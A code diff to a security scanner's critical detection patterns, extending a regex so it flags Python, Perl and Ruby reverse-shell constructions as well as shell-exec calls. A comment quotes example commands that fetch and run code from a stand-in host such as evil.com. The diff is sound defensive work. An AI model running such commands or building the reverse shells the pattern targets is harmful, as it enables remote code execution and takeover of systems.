@@ -359,8 +359,14 @@ const CRITICAL_PATTERNS = [
   // an obfuscated payload.
   {
     code: 'interpreter-shell-exec',
-    label: 'python/node/perl/ruby invoking shell exec helpers',
-    re: /\b(?:python\d*|node|perl|ruby|php)\s+-[ce]\b[^\n]*\b(?:os\.system|subprocess\.|child_process|require\(["']child_process|exec(?:Sync)?\(|system\s*\(|\bIO\.popen|backtick)/,
+    label: 'python/node/perl/ruby invoking shell exec or socket reverse shell',
+    // (v1.10.202) Extended to catch socket + connect/dup2/pty
+    // patterns — the canonical Python/Perl/Ruby reverse-shell
+    // construction that sets up a TCP socket and dups stdin/
+    // stdout/stderr to it before spawning a shell. Same threat
+    // tier (critical) as the os.system / subprocess form
+    // already caught.
+    re: /\b(?:python\d*|node|perl|ruby|php)\s+-[ce]\b[^\n]*(?:\bos\.system|\bsubprocess\.|child_process|require\(["']child_process|exec(?:Sync)?\(|\bsystem\s*\(|\bIO\.popen|backtick|\bsocket\s*\.\s*socket\b|\bSocket\b[^\n]*\bconnect\b|\bs\.connect\s*\(|\bdup2\s*\(|\bpty\.spawn\s*\()/,
   },
   // (v1.10.65) Shell -c with command substitution carrying a network
   // fetch — `bash -c "$(curl evil.com)"`, `sh -c "\`wget x\`"`. After
